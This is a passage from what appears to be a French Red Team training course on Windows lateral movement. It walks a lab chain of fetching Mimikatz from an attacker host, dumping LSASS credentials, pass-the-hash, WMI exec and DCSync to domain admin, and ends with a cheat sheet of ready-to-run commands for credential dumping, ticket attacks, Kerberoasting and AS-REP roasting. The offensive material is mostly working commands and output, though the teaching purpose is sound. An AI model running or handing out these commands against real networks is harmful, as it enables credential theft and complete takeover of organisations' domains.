$client.DownloadFile('http://10.0.0.10:8000/mimikatz.exe', 'C:\Windows\Temp\mimikatz.exe')

# Étape 1B : Extraction des credentials sur PC01
cd C:\Windows\Temp
# Exécute Mimikatz en ligne de commande (sans interface interactive)
# Les commandes sont passées directement en arguments :
# 1. privilege::debug → active SeDebugPrivilege
# 2. token::elevate → élève au niveau SYSTEM
# 3. sekurlsa::logonpasswords → extrait les hashs NTLM et mots de passe
# 4. exit → quitte Mimikatz
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `New-Object System.Net.WebClient` | Crée un client HTTP PowerShell pour télécharger des fichiers |
| `$client.DownloadFile(URL, DEST)` | Télécharge un fichier depuis une URL HTTP vers une destination locale |
| `.\mimikatz.exe "cmd1" "cmd2" ... "exit"` | Exécute Mimikatz en mode non-interactif : chaque argument est une commande Mimikatz, exécutée séquentiellement |

**Résultat :**
```
jdupont:CORP:31d6cfe0d16ae931b73c59d7e0c089c0
Administrateur (local):8846f7eaee8fb117ad06bdd830b7586c
```

#### Étape 2 : Pass-the-Hash vers FILESERVER

```bash
# Vérifier la portée du hash admin local : teste une plage d'adresses
# (10.0.1.15 = PC01, 10.0.1.50 = FILESERVER, 10.0.1.60 = fin de plage)
# Permet de trouver quelles machines partagent le même mot de passe admin local
crackmapexec smb 10.0.1.15-60 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Résultat : l'admin local de PC01 est aussi admin sur FILESERVER
# (même hash, probablement dû à un déploiement d'image standardisée)

# Obtient un shell interactif distant sur FILESERVER
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50

# Depuis le shell distant, confirme l'identité SYSTEM
whoami
# nt authority\system
# Confirme le nom de la machine
hostname
# FILESERVER
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb 10.0.1.15-60 -u Administrateur -H HASH` | Teste le hash sur une plage de 46 machines pour trouver les cibles vulnérables |
| `impacket-psexec -hashes :HASH DOMAIN/Administrateur@HOST` | Shell distant via PtH sur FILESERVER |
| `whoami` (shell distant) | Confirme que le processus tourne sous SYSTEM |
| `hostname` (shell distant) | Confirme la machine cible |

#### Étape 3 : Credential Dump sur FILESERVER

```mimikatz
# Sur FILESERVER, exécuter Mimikatz pour extraire les credentials
# Cette fois, on cherche le hash d'un administrateur du domaine
# (un admin domaine est connecté à FILESERVER en session interactive)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | Exécution non-interactive : active les droits de débogage, extrait les identifiants LSASS, puis quitte. Cible : trouver le hash d'un administrateur de domaine connecté |

**Résultat :** Un administrateur de domaine est connecté à FILESERVER.
```
User: CORP\Administrator (admin domaine)
Hash NTLM: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
```

#### Étape 4 : WMI exec vers SRV01

```bash
# Utilise le hash de l'administrateur domaine (trouvé sur FILESERVER)
# pour se connecter discrètement à SRV01 (serveur SQL) via WMI
impacket-wmiexec -hashes :9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d corp.local/Administrator@10.0.1.30

# Dans le shell distant :
whoami
# corp\administrator (administrateur du domaine !)
hostname
# SRV01
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-wmiexec -hashes :HASH DOMAIN/Administrator@10.0.1.30` | Shell distant discret via WMI vers SRV01 en utilisant le hash de l'admin domaine volé sur FILESERVER |

#### Étape 5 : DCSync vers DC01

```bash
# DCSync : extrait tous les hashs du domaine depuis le contrôleur de domaine
# Utilise le hash de l'Administrateur domaine (droits de réplication)
# Sauvegarde les résultats dans domain_hashes.txt
impacket-secretsdump -just-dc -hashes :9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d corp.local/Administrator@10.0.1.10 > domain_hashes.txt

# Extrait les hashs des comptes critiques :
# - Administrateur (RID 500) : admin domaine
# - krbtgt (RID 502) : pour Golden Ticket
grep -E 'krbtgt|Administrator|500:|502:' domain_hashes.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-secretsdump -just-dc -hashes :HASH DOMAIN/Admin@DC > fichier` | DCSync complet vers le DC : extrait tous les hashs du domaine et les sauvegarde |
| `grep -E 'krbtgt|Administrator|500:|502:'` | Recherche les lignes contenant les comptes les plus critiques : Administrateur (RID 500) et KRBTGT (RID 502) |

**Résultat :**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e:::
```

#### Étape 6 : Vérification Domain Admin

```bash
# Confirme que le hash de l'Administrateur domaine fonctionne sur le DC
# (Pwn3d!) = accès administrateur confirmé sur le contrôleur de domaine
crackmapexec smb 10.0.1.10 -u Administrator -H 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
# [+] corp.local\Administrator (Pwn3d!)
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb DC_IP -u Administrateur -H HASH` | Vérification finale : l'Administrateur domaine a les droits sur le DC. `(Pwn3d!)` = contrôle total du domaine confirmé |

### 10.3 Tableau ATT&CK complet

| Phase | Tactic | Technique | Sub-technique | Code | Outil |
|---|---|---|---|---|---|
| 1 | Credential Access | OS Credential Dumping | LSASS Memory | T1003.001 | Mimikatz |
| 2 | Lateral Movement | Use Alternate Authentication Material | Pass-the-Hash | T1550.002 | impacket-psexec |
| 3 | Credential Access | OS Credential Dumping | LSASS Memory | T1003.001 | Mimikatz |
| 4 | Lateral Movement | Remote Services | Windows Management Instrumentation | T1021.003 | impacket-wmiexec |
| 5 | Credential Access | OS Credential Dumping | DCSync | T1003.006 | secretsdump.py |
| 6 | Persistence | Valid Accounts | Domain Accounts | T1078.002 | CrackMapExec |

### 10.4 Heat Map

**Fichier JSON pour ATT&CK Navigator :**

```json
{
    "name": "SCAD — Lateral Movement & Elevation",
    "version": "4.1",
    "domain": "mitre-enterprise",
    "description": "Heat map du TP synthèse Module 8 — SDV 2026",
    "techniques": [
        {
            "techniqueID": "T1003",
            "sub-techniques": [
                {
                    "techniqueID": "T1003.001",
                    "color": "#d62728",
                    "score": 95,
                    "comment": "Credential Dump LSASS sur PC01 et FILESERVER"
                },
                {
                    "techniqueID": "T1003.006",
                    "color": "#d62728",
                    "score": 100,
                    "comment": "DCSync sur DC01 — réplication des hashs du domaine"
                }
            ],
            "color": "#d62728",
            "score": 100,
            "comment": "Credential Access — clé de toute l'attaque"
        },
        {
            "techniqueID": "T1550",
            "sub-techniques": [
                {
                    "techniqueID": "T1550.002",
                    "color": "#d62728",
                    "score": 90,
                    "comment": "Pass-the-Hash de PC01 vers FILESERVER"
                }
            ],
            "color": "#d62728",
            "score": 90,
            "comment": "Alternate Authentication Material"
        },
        {
            "techniqueID": "T1021",
            "sub-techniques": [
                {
                    "techniqueID": "T1021.003",
                    "color": "#f5b042",
                    "score": 80,
                    "comment": "WMI exec de FILESERVER vers SRV01"
                }
            ],
            "color": "#f5b042",
            "score": 80,
            "comment": "Remote Services"
        },
        {
            "techniqueID": "T1078",
            "sub-techniques": [
                {
                    "techniqueID": "T1078.002",
                    "color": "#f5b042",
                    "score": 85,
                    "comment": "Vol de compte admin domaine"
                }
            ],
            "color": "#f5b042",
            "score": 85,
            "comment": "Valid Accounts"
        }
    ],
    "gradient": {
        "colors": ["#98df8a", "#f5b042", "#d62728"],
        "minValue": 0,
        "maxValue": 100
    },
    "legendItems": [
        {"label": "Non utilisé", "color": "#ececec"},
        {"label": "Utilisé", "color": "#f5b042"},
        {"label": "Réussi (critique)", "color": "#d62728"}
    ],
    "filters": {
        "stages": ["act"],
        "platforms": ["windows"]
    },
    "sorting": 0,
    "viewMode": 0,
    "hideDisabled": false
}
```

### 10.5 Questions de synthèse

1. **Quel est le point de départ de toute attaque de lateral movement ?**
   - Le credential dumping. Sans identifiants, aucun mouvement latéral n'est possible.

2. **Pourquoi le Pass-the-Hash fonctionne-t-il même si on ne connaît pas le mot de passe ?**
   - Car le protocole NTLM utilise le hash du mot de passe comme secret partagé, pas le mot de passe lui-même.

3. **Quelle est la différence entre PtH, PtT et Overpass-the-Hash ?**
   - **PtH** : utilise directement le hash NTLM pour l'auth NTLM
   - **PtT** : injecte un ticket Kerberos déjà obtenu
   - **Overpass-the-Hash** : convertit un hash NTLM en TGT Kerberos

4. **Quel est l'avantage de l'Overpass-the-Hash sur le PtH simple ?**
   - Contourner la limitation WinRM (qui n'accepte pas le PtH direct)
   - Permet l'authentification Kerberos (plus furtive)

5. **Quels droits sont nécessaires pour un DCSync ?**
   - `Replicating Directory Changes` et `Replicating Directory Changes All` sur le contexte de nommage du domaine.

6. **Comment détecter un Kerberoasting ?**
   - EventID 4769 (TGS demandé) pour des comptes de service, surtout en grand nombre et depuis une source inhabituelle.

7. **Quelle est la défense la plus efficace contre l'AS-REP Roasting ?**
   - Activer la pré-authentification Kerberos sur tous les comptes (valeur par défaut).

---

## 11. Annexes

### 11.1 Tableau récapitulatif des outils

| Outil | Type | Technique | Usage |
|---|---|---|---|
| **Mimikatz** | Binaire Windows | T1003, T1550.003 | Dump credentials, manipulation tickets |
| **Rubeus** | Binaire Windows (.NET) | T1550.003, T1558.003, T1558.004 | Kerberos abuse |
| **LaZagne** | Binaire Windows | T1003 | Extraction mots de passe stockés |
| **ProcDump** | Binaire Windows | T1003 (auxiliaire) | Dump LSASS pour analyse offline |
| **pypykatz** | Python | T1003 | Extraction credentials depuis dump (offline) |
| **CrackMapExec** | Python | T1550.002, T1021 | Automatisation post-exploitation |
| **impacket-psexec** | Python | T1021 | Exécution distante via SMB |
| **impacket-wmiexec** | Python | T1021.003 | Exécution distante via WMI |
| **impacket-smbexec** | Python | T1021 | Exécution via services/tâches |
| **evil-winrm** | Ruby | T1021 | Connexion WinRM |
| **secretsdump.py** (impacket) | Python | T1003.006 | DCSync |
| **impacket-GetUserSPNs** | Python | T1558.003 | Kerberoasting |
| **impacket-GetNPUsers** | Python | T1558.004 | AS-REP Roasting |
| **hashcat** | Binaire | T1558.003, T1558.004 | Cracking de hashs |
| **John the Ripper** | Binaire | T1558.003, T1558.004 | Cracking de hashs |

### 11.2 Commandes essentielles

```bash
# ============================================================
# CREDENTIAL DUMP — Extraction d'identifiants depuis un poste Windows
# ============================================================

# Mimikatz — extraction des hashs NTLM et mots de passe depuis LSASS
# privilege::debug = active SeDebugPrivilege
# sekurlsa::logonpasswords = lit les sessions LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Mimikatz — dump de la base SAM (comptes locaux uniquement)
# token::elevate = élévation vers SYSTEM (nécessaire pour SAM)
# lsadump::sam = lit et déchiffre la ruche SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Mimikatz — extraction des clés Kerberos (AES256, AES128, RC4)
# sekurlsa::ekeys = extrait les clés pour Overpass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" "exit"

# ProcDump (Microsoft légitime) + pypykatz (extraction offline)
# -ma = dump mémoire complet, -accepteula = accepte licence
# pypykatz = extraction Python sans Wine
procdump.exe -ma -accepteula lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp

# ============================================================
# PASS-THE-HASH (PtH) — Authentification par hash NTLM
# ============================================================

# CrackMapExec : test rapide de credentials SMB
crackmapexec smb TARGET -u USER -H HASH
# impacket-psexec : shell distant via service SMB
impacket-psexec -hashes :HASH DOMAIN/USER@TARGET
# impacket-wmiexec : shell distant via WMI (plus discret)
impacket-wmiexec -hashes :HASH DOMAIN/USER@TARGET

# ============================================================
# OVERPASS-THE-HASH — Conversion hash NTLM → TGT Kerberos
# (Contourne la limitation PtH de WinRM)
# ============================================================

# Obtention d'un TGT depuis un hash NTLM
impacket-getTGT DOMAIN/USER -hashes :HASH
# Définit le chemin du cache Kerberos
export KRB5CCNAME=/path/to/USER.ccache
# Connexion WinRM avec Kerberos (contourne PtH limit)
evil-winrm -i TARGET.DOMAIN -u USER -k

# ============================================================
# PASS-THE-TICKET (PtT) — Injection de tickets Kerberos
# ============================================================

# Export des tickets LSASS vers fichiers .kirbi
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
# Injection d'un ticket .kirbi dans le cache Kerberos
mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"

# ============================================================
# DCSync — Réplication MS-DRSR pour extraire tous les hashs
# (Nécessite droits de réplication Active Directory)
# ============================================================

# DCSync complet via impacket (tous les hashs du domaine)
impacket-secretsdump -just-dc -hashes :HASH DOMAIN/ADMIN@DC
# DCSync d'un utilisateur spécifique via Mimikatz
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:ADMIN" "exit"

# ============================================================
# KERBEROASTING — Demande de TGS pour comptes de service
# (N'importe quel utilisateur domaine peut demander un TGS)
# ============================================================

# Découverte des SPN + demande des TGS (format hashcat)
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip IP -request -format hashcat
# Cracking des TGS RC4 (mode 13100) avec dictionnaire
hashcat -m 13100 tgs_hashes.txt rockyou.txt -o cracked.txt

# ============================================================
# AS-REP ROASTING — Comptes sans pré-authentification Kerberos
# (Aucune authentification requise)
# ============================================================

# Demande d'AS-REP pour les comptes sans preauth
impacket-GetNPUsers DOMAIN/ -dc-ip IP -no-pass -usersfile users.txt -format hashcat
# Cracking des AS-REP RC4 (mode 18200) avec dictionnaire
hashcat -m 18200 asrep_hashes.txt rockyou.txt -o cracked.txt
```

**Explication des commandes :**

| Section | Commandes clés | Rôle |
|---|---|---|
| **CREDENTIAL DUMP** | `mimikatz ... sekurlsa::logonpasswords` | Extraction des hashs NTLM depuis LSASS |
| | `mimikatz ... lsadump::sam` | Dump des comptes locaux (SAM) |
| | `procdump.exe -ma lsass.exe lsass.dmp` + `pypykatz lsa minidump` | Dump LSASS offline pour contourner les EDR |
| **PASS-THE-HASH** | `crackmapexec smb TARGET -u USER -H HASH` | Test rapide de credentials SMB |
| | `impacket-psexec -hashes :HASH DOMAIN/USER@TARGET` | Shell distant SMB (PsExec) |
| | `impacket-wmiexec -hashes :HASH DOMAIN/USER@TARGET` | Shell distant WMI (plus discret) |
| **OVERPASS-THE-HASH** | `impacket-getTGT DOMAIN/USER -hashes :HASH` | Obtention d'un TGT depuis un hash NTLM |
| | `evil-winrm -i TARGET -u USER -k` | Connexion WinRM via Kerberos (contournement PtH) |
| **PASS-THE-TICKET** | `mimikatz ... sekurlsa::tickets /export` | Export des tickets Kerberos |
| | `mimikatz ... kerberos::ptt ticket.kirbi` | Injection de ticket dans le cache |
| **DCSync** | `impacket-secretsdump -just-dc -hashes :HASH DOMAIN/ADMIN@DC` | Extraction de tous les hashs du domaine |
| **KERBEROASTING** | `impacket-GetUserSPNs ... -request -format hashcat` | Découverte SPN + demande TGS |
| | `hashcat -m 13100 tgs_hashes.txt rockyou.txt` | Cracking des TGS RC4 |
| **AS-REP ROASTING** | `impacket-GetNPUsers ... -no-pass` | Demande AS-REP sans auth |
| | `hashcat -m 18200 asrep_hashes.txt rockyou.txt` | Cracking des AS-REP RC4 |

### 11.3 Glossaire

| Terme | Définition |
|---|---|
| **NTLM** | New Technology LAN Manager — protocole d'authentification challenge-response |
| **Hash NTLM** | Hash du mot de passe stocké dans le SAM ou AD (format MD4) |
| **LSASS** | Local Security Authority Subsystem Service — processus gérant l'authentification |
| **SAM** | Security Account Manager — base de données des comptes locaux |
| **NTDS.dit** | Active Directory database — fichier contenant tous les objets du domaine |
| **KDC** | Key Distribution Center — service Kerberos sur le contrôleur de domaine |
| **TGT** | Ticket Granting Ticket — ticket d'authentification Kerberos initial |
| **TGS** | Ticket Granting Service — ticket pour un service spécifique |
| **SPN** | Service Principal Name — identifiant unique d'un service dans Kerberos |
| **DCSync** | Technique de réplication MS-DRSR pour extraire les hashs du domaine |
| **MS-DRSR** | Microsoft Directory Replication Service — protocole de réplication AD |
| **PtH** | Pass-the-Hash — authentification par hash NTLM sans mot de passe |
| **PtT** | Pass-the-Ticket — injection de ticket Kerberos |
| **Overpass-the-Hash** | Conversion hash NTLM en TGT Kerberos |
| **Kerberoasting** | Demande de TGS pour cracker le mot de passe d'un compte de service |
| **AS-REP Roasting** | Demande d'AS-REP pour les comptes sans pré-authentification |
| **SCAD** | Séquence Complète d'Attaque Dirigée |

### 11.4 Références

| Ressource | URL |
|---|---|
| MITRE ATT&CK — TA0008 (Lateral Movement) | https://attack.mitre.org/tactics/TA0008/ |
| MITRE ATT&CK — T1003 (OS Credential Dumping) | https://attack.mitre.org/techniques/T1003/ |
| MITRE ATT&CK — T1550 (Use Alternate Authentication Material) | https://attack.mitre.org/techniques/T1550/ |
| MITRE ATT&CK — T1558 (Steal or Forge Kerberos Tickets) | https://attack.mitre.org/techniques/T1558/ |
| Mimikatz (Benjamin Delpy) | https://github.com/gentilkiwi/mimikatz |
| Rubeus (Harmj0y) | https://github.com/GhostPack/Rubeus |
| Impacket (SecureAuth) | https://github.com/fortra/impacket |
| LaZagne (AlessandroZ) | https://github.com/AlessandroZ/LaZagne |
| CrackMapExec (byt3bl33d3r) | https://github.com/byt3bl33d3r/CrackMapExec |
| evil-winrm (Hackplayers) | https://github.com/Hackplayers/evil-winrm |
| Hashcat | https://hashcat.net/hashcat/ |
| ProcDump (SysInternals) | https://docs.microsoft.com/sysinternals/downloads/procdump |
| pypykatz (SkelSec) | https://github.com/skelsec/pypykatz |
| Atomic Red Team (T1003 tests) | https://github.com/redcanaryco/atomic-red-team |
| NIS2 Directive (EUR-Lex) | https://eur-lex.europa.eu/eli/dir/2022/2555 |

---

*Document rédigé pour la formation Red Team — Master 2 Sécurité et Défense des Systèmes d'Information — SDV 2026*
